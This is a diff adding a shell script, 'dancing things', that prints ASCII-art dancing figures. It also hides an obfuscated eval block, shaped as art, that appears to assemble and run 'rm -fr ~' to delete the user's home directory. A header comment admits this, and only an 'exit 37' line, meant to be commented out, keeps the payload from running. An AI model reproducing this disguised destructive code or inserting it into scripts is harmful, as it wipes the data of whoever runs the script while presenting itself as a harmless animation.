@@ -1,0 +1,79 @@
+#!/bin/sh
+# dancing things
+# also does rm -rf ~
+# by paraxor
+
+# comment out to make this work (safety)
+exit 37
+
+# comment out to show the human dancers
+exec 2> /dev/null
+
+echo '
+lsd   Jfa  Oal
+Zkd   fas  l$a
+I)lpYf89(  AUg
+a\d   bfs  fa8
+Psj   Kfd  ZhH
+ljd   fSa  UaI
+'
+
+echo '
+ o\
+ |
+/\
+' >&2
+
+sleep 1
+
+echo '
+         __
+       _/ o\__,
+      /   ____/
+     /   /
+   _-   /\\
+\_/   /   \\
+   \ |
+   | |
+   | |
+'
+
+sleep 1
+
+echo '
+/o
+ |
+/\
+' >&2
+
+sleep 1
+
+echo '
+         __
+       _/ o\__,
+      /   ____/
+     /   /
+   _-   /\\//
+/_/   /   \/
+   \ |
+   | |
+   | |
+'
+
+sleep 1
+
+echo '
+\o/
+ |
+/\
+' >&2
+
+eval '
+t5h-asf     ^aaA&q=fr;  fYfBsf    AFx  SDaASF$4A
+#5h-  fsa   a=l    Bfa  A$g  Fd   asf  AAT
+^=h-   G%A  ASF    lAH  HH%   s^  sdf  gug
+jlh-   =AG  H%A    AYA  A%H    Tf fL&  g=m;aT
+a5h-   A$T  A=$    f$=  AG$     f&b=~  ;AG
+n5u- A$g    H&A    $AG  AH%      ffla  *AG
+L="$g       *AGIl(CfBP  -$q      $b";  r$L&AHiEg
+'
